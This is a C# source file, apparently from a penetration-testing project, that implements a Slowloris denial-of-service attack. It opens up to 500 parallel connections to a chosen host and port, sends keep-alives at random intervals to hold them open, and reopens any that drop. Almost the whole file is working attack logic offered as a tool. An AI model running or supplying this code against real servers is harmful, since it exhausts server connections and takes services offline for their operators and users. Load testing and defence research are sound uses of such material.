using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Savaged.PenTesting.DOS
{
    public class SlowLoris
    {
        public const int MAX_CONNECTIONS = 500;

        private readonly Action[] _actions;
        private readonly IList<SlowLorisConnection> _connections;

        private static readonly Random _rnd = new Random();

        public event EventHandler<SlowLorisEventArgs> Event = delegate { };

        public SlowLoris(string target, int port, bool useSsl, int count)
        {
            if (count < 1 || count > MAX_CONNECTIONS)
            {
                throw new ArgumentException("Max count outside bounds!");
            }
            _actions = new Action[count];
            _connections = new List<SlowLorisConnection>();

            Connection = new SlowLorisConnection(target, port, useSsl);

            for (int i = 0; i < count; i++)
            {
                var conn = Connection.Clone(i + 1);
                _connections.Add(conn);

                _actions[i] = () => KeepAliveThread(conn);
            }
        }

        public SlowLorisConnection Connection { get; private set; }

        public void Attack(CancellationToken ct)
        {
            var opt = new ParallelOptions
            {
                CancellationToken = ct
            };
            Parallel.Invoke(opt, _actions);
        }

        public void Stop()
        {
            foreach (var conn in _connections)
            {
                conn.Close();
            }
        }

        private void KeepAliveThread(SlowLorisConnection conn)
        {
            if (conn == null)
            {
                throw new ArgumentNullException(nameof(conn));
            }
            while (true)
            {
                var result = TryKeepAlive(conn);
                if (!result)
                {
                    RaiseEvent($"Connection # {conn?.ID}->Open");
                    conn.Open();

                    result = conn.IsOpen;
                    if (!result)
                    {
                        RaiseEvent($"Connection # {conn?.ID}->Close");
                        conn.Close();
                        break;
                    }
                }
                else
                {
                    Thread.Sleep(_rnd.Next(2000, 10000));
                }
            }
        }

        private bool TryKeepAlive(SlowLorisConnection conn)
        {
            if (conn?.IsOpen != true)
            {
                return false;
            }
            RaiseEvent($"Connection # {conn?.ID}->KeepAlive");
            conn.KeepAlive();
            var result = conn.IsOpen;
            return result;
        }

        private void RaiseEvent(string @event)
        {
            Event?.Invoke(this, new SlowLorisEventArgs(@event));
        }

    }
}

